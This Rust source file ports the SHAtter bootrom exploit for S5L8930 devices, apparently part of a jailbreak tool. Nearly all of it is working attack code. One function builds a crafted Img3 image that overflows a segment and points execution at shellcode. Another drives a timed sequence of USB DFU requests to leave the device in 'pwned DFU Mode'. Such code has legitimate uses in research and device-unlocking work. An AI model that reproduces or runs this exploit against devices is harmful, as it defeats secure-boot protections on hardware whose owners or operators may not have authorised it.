//! Port of `SHAtter.py`: the segment overflow that pwns S5L8930 devices.
//! Credit: posixninja and pod2g.

use std::thread::sleep;
use std::time::Duration;

use crate::dfu;
use crate::shellcode;
use crate::utilities::die;

/// `SHAtter.generate_payload`
fn generate_payload() -> Vec<u8> {
    let shellcode_address: u32 = 0x8402_F198 + 1;

    // struct.pack('<40sI', '\xF0' * 40, shellcode_address)
    let mut data = vec![0xF0u8; 40];
    data.extend_from_slice(&shellcode_address.to_le_bytes());

    // struct.pack('<4s2I4s2I', 'HSHS', 12, 0, 'TREC', 12, 0)
    let mut tags = data.clone();
    tags.extend_from_slice(b"HSHS"); // 'SHSH'[::-1]
    tags.extend_from_slice(&12u32.to_le_bytes());
    tags.extend_from_slice(&0u32.to_le_bytes());
    tags.extend_from_slice(b"TREC"); // 'CERT'[::-1]
    tags.extend_from_slice(&12u32.to_le_bytes());
    tags.extend_from_slice(&0u32.to_le_bytes());

    // struct.pack('<4s3I4s', '3gmI', 20 + len(tags), len(tags), len(data), 'ssbi')
    let mut out = Vec::new();
    out.extend_from_slice(b"3gmI"); // 'Img3'[::-1]
    for value in [
        (20 + tags.len()) as u32,
        tags.len() as u32,
        data.len() as u32,
    ] {
        out.extend_from_slice(&value.to_le_bytes());
    }
    out.extend_from_slice(b"ssbi"); // 'ibss'[::-1]

    let shellcode = shellcode::SHATTER;
    assert!(shellcode.len() <= 1024);

    out.extend_from_slice(&tags);
    out.extend_from_slice(shellcode);
    out
}

/// `SHAtter.exploit`
pub fn exploit() {
    println!("*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***");

    let device = dfu::acquire_device();
    println!("Found: {}", device.serial_number);
    let serial_number = device.serial_number.clone();

    if serial_number.contains("PWND:[") {
        println!("Device is already in pwned DFU Mode. Not executing exploit.");
        return;
    }

    if !serial_number.contains("CPID:8930") {
        die("ERROR: Not a compatible device. This exploit is for S5L8930 devices only. Exiting.");
    }

    if !serial_number.contains("SRTG:[iBoot-574.4]") {
        println!("ERROR: CPID is compatible, but serial number string does not match.");
        println!("Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.");
        std::process::exit(1);
    }

    dfu::reset_counters(&device);
    dfu::get_data(&device, 0x40);
    dfu::usb_reset(&device);
    drop(device);

    let device = dfu::acquire_device();
    dfu::request_image_validation(&device);
    drop(device);

    let device = dfu::acquire_device();
    dfu::get_data(&device, 0x2C000);
    drop(device);

    sleep(Duration::from_millis(500));

    let device = dfu::acquire_device();
    dfu::reset_counters(&device);
    dfu::get_data(&device, 0x140);
    dfu::usb_reset(&device);
    drop(device);

    let device = dfu::acquire_device();
    dfu::request_image_validation(&device);
    drop(device);

    let device = dfu::acquire_device();
    dfu::send_data(&device, &generate_payload());
    dfu::get_data(&device, 0x2C000);
    drop(device);

    sleep(Duration::from_millis(500));

    let device = dfu::acquire_device();
    let failed = !device.serial_number.contains("PWND:[SHAtter]");
    drop(device);

    if failed {
        die("ERROR: Exploit failed. Device did not enter pwned DFU Mode.");
    }

    println!("Device is now in pwned DFU Mode.");
}
